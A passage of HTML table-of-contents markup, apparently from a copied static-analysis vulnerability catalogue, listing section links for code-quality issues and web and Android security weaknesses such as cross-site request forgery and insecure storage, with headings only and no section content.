Naming(member_and_method)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-74"><span class="toc-number">1.2.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-75"><span class="toc-number">1.2.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-76"><span class="toc-number">1.2.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-73"><span class="toc-number">1.2.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Empty-Synchronized-Block"><span class="toc-number">1.2.26.</span> <span class="toc-text">Poor Style: Empty Synchronized Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-75"><span class="toc-number">1.2.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-76"><span class="toc-number">1.2.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-77"><span class="toc-number">1.2.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-74"><span class="toc-number">1.2.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Identifier-Contains-Dollar-Symbol"><span class="toc-number">1.2.27.</span> <span class="toc-text">Poor Style: Identifier Contains Dollar Symbol ($)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-76"><span class="toc-number">1.2.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-77"><span class="toc-number">1.2.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-78"><span class="toc-number">1.2.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-75"><span class="toc-number">1.2.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Redundant-Initialization"><span class="toc-number">1.2.28.</span> <span class="toc-text">Poor Style: Redundant Initialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-77"><span class="toc-number">1.2.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-78"><span class="toc-number">1.2.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-79"><span class="toc-number">1.2.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-76"><span class="toc-number">1.2.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Value-Never-Read"><span class="toc-number">1.2.29.</span> <span class="toc-text">Poor Style: Value Never Read</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-78"><span class="toc-number">1.2.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-79"><span class="toc-number">1.2.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-80"><span class="toc-number">1.2.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-77"><span class="toc-number">1.2.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-File-Separator"><span class="toc-number">1.2.30.</span> <span class="toc-text">Portability Flaw: File Separator</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-79"><span class="toc-number">1.2.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-80"><span class="toc-number">1.2.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-81"><span class="toc-number">1.2.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-78"><span class="toc-number">1.2.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-Locale-Dependent-Comparison"><span class="toc-number">1.2.31.</span> <span class="toc-text">Portability Flaw: Locale Dependent Comparison</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-80"><span class="toc-number">1.2.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-81"><span class="toc-number">1.2.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-82"><span class="toc-number">1.2.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-79"><span class="toc-number">1.2.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Portability-Flaw-Native-SQL"><span class="toc-number">1.2.32.</span> <span class="toc-text">Portability Flaw: Native SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-81"><span class="toc-number">1.2.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-82"><span class="toc-number">1.2.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-83"><span class="toc-number">1.2.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-80"><span class="toc-number">1.2.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Race-Condition-Class-Initialization-Cycle"><span class="toc-number">1.2.33.</span> <span class="toc-text">Race Condition: Class Initialization Cycle</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-82"><span class="toc-number">1.2.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-83"><span class="toc-number">1.2.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-84"><span class="toc-number">1.2.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-81"><span class="toc-number">1.2.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redundant-Null-Check"><span class="toc-number">1.2.34.</span> <span class="toc-text">Redundant Null Check</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-83"><span class="toc-number">1.2.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-84"><span class="toc-number">1.2.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-85"><span class="toc-number">1.2.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-82"><span class="toc-number">1.2.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-Camera"><span class="toc-number">1.2.35.</span> <span class="toc-text">Unreleased Resource: Android Camera</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-84"><span class="toc-number">1.2.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-85"><span class="toc-number">1.2.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-86"><span class="toc-number">1.2.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-83"><span class="toc-number">1.2.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-Media"><span class="toc-number">1.2.36.</span> <span class="toc-text">Unreleased Resource: Android Media</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-85"><span class="toc-number">1.2.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-86"><span class="toc-number">1.2.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-87"><span class="toc-number">1.2.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-84"><span class="toc-number">1.2.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Android-SQLite-Database"><span class="toc-number">1.2.37.</span> <span class="toc-text">Unreleased Resource: Android SQLite Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-86"><span class="toc-number">1.2.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-87"><span class="toc-number">1.2.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-88"><span class="toc-number">1.2.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-85"><span class="toc-number">1.2.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Database"><span class="toc-number">1.2.38.</span> <span class="toc-text">Unreleased Resource: Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-87"><span class="toc-number">1.2.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-88"><span class="toc-number">1.2.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-89"><span class="toc-number">1.2.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-86"><span class="toc-number">1.2.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Files"><span class="toc-number">1.2.39.</span> <span class="toc-text">Unreleased Resource: Files</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-88"><span class="toc-number">1.2.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-89"><span class="toc-number">1.2.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-90"><span class="toc-number">1.2.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-87"><span class="toc-number">1.2.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Sockets"><span class="toc-number">1.2.40.</span> <span class="toc-text">Unreleased Resource: Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-89"><span class="toc-number">1.2.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-90"><span class="toc-number">1.2.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-91"><span class="toc-number">1.2.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-88"><span class="toc-number">1.2.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Streams"><span class="toc-number">1.2.41.</span> <span class="toc-text">Unreleased Resource: Streams</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-90"><span class="toc-number">1.2.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-91"><span class="toc-number">1.2.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-92"><span class="toc-number">1.2.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-89"><span class="toc-number">1.2.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unreleased-Resource-Synchronization"><span class="toc-number">1.2.42.</span> <span class="toc-text">Unreleased Resource: Synchronization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-91"><span class="toc-number">1.2.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-92"><span class="toc-number">1.2.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-93"><span class="toc-number">1.2.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-90"><span class="toc-number">1.2.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#封装"><span class="toc-number">1.3.</span> <span class="toc-text">封装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Default-url-invoke-disallowed-Setting"><span class="toc-number">1.3.1.</span> <span class="toc-text">ADF Bad Practices: Default url-invoke-disallowed Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-92"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-93"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-94"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-91"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Encryption-Secret-Held-in-Static-Field"><span class="toc-number">1.3.2.</span> <span class="toc-text">Android Bad Practices: Encryption Secret Held in Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-93"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-94"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-95"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-92"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.3.3.</span> <span class="toc-text">Android Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-94"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-95"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-96"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-93"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Request-Forgery"><span class="toc-number">1.3.4.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-95"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-96"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-97"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-94"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-WebSocket-Hijacking"><span class="toc-number">1.3.5.</span> <span class="toc-text">Cross-Site WebSocket Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-96"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-97"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-98"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-95"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Based-Cross-Zone-Scripting"><span class="toc-number">1.3.6.</span> <span class="toc-text">File Based Cross-Zone Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-97"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-98"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-99"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-96"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Content-Security-Policy"><span class="toc-number">1.3.7.</span> <span class="toc-text">HTML5: Missing Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-98"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-99"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-100"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-97"><span class="toc-number">1.3.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Framing-Protection"><span class="toc-number">1.3.8.</span> <span class="toc-text">HTML5: Missing Framing Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-99"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-100"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-101"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-98"><span class="toc-number">1.3.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Content-Security-Policy"><span class="toc-number">1.3.9.</span> <span class="toc-text">HTML5: Overly Permissive Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-100"><span class="toc-number">1.3.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-101"><span class="toc-number">1.3.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-102"><span class="toc-number">1.3.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-99"><span class="toc-number">1.3.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.3.10.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-101"><span class="toc-number">1.3.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-102"><span class="toc-number">1.3.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-100"><span class="toc-number">1.3.10.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-CORS-Policy"><span class="toc-number">1.3.11.</span> <span class="toc-text">HTML5: Overly Permissive CORS Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-102"><span class="toc-number">1.3.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-103"><span class="toc-number">1.3.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-103"><span class="toc-number">1.3.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-101"><span class="toc-number">1.3.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Referrer-Policy"><span class="toc-number">1.3.12.</span> <span class="toc-text">HTML5: Overly Permissive Referrer-Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-103"><span class="toc-number">1.3.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-104"><span class="toc-number">1.3.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-104"><span class="toc-number">1.3.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-102"><span class="toc-number">1.3.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Unenforced-Content-Security-Policy"><span class="toc-number">1.3.13.</span> <span class="toc-text">HTML5: Unenforced Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-104"><span class="toc-number">1.3.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-105"><span class="toc-number">1.3.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-105"><span class="toc-number">1.3.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-103"><span class="toc-number">1.3.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-Field"><span class="toc-number">1.3.14.</span> <span class="toc-text">Hidden Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-105"><span class="toc-number">1.3.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-106"><span class="toc-number">1.3.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-106"><span class="toc-number">1.3.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-104"><span class="toc-number">1.3.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-Backup-Storage"><span class="toc-number">1.3.15.</span> <span class="toc-text">Insecure Storage: Android Backup Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-106"><span class="toc-number">1.3.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-107"><span class="toc-number">1.3.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-107"><span class="toc-number">1.3.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-105"><span class="toc-number">1.3.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-External-Storage"><span class="toc-number">1.3.16.</span> <span class="toc-text">Insecure Storage: Android External Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-107"><span class="toc-number">1.3.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-108"><span class="toc-number">1.3.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-108"><span class="toc-number">1.3.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-106"><span class="toc-number">1.3.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-World-Readable-or-Writeable"><span class="toc-number">1.3.17.</span> <span class="toc-text">Insecure Storage: Android World Readable or Writeable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-108"><span class="toc-number">1.3.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-109"><span class="toc-number">1.3.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-109"><span class="toc-number">1.3.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-107"><span class="toc-number">1.3.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-HTTP-Response-Cache-Leak"><span 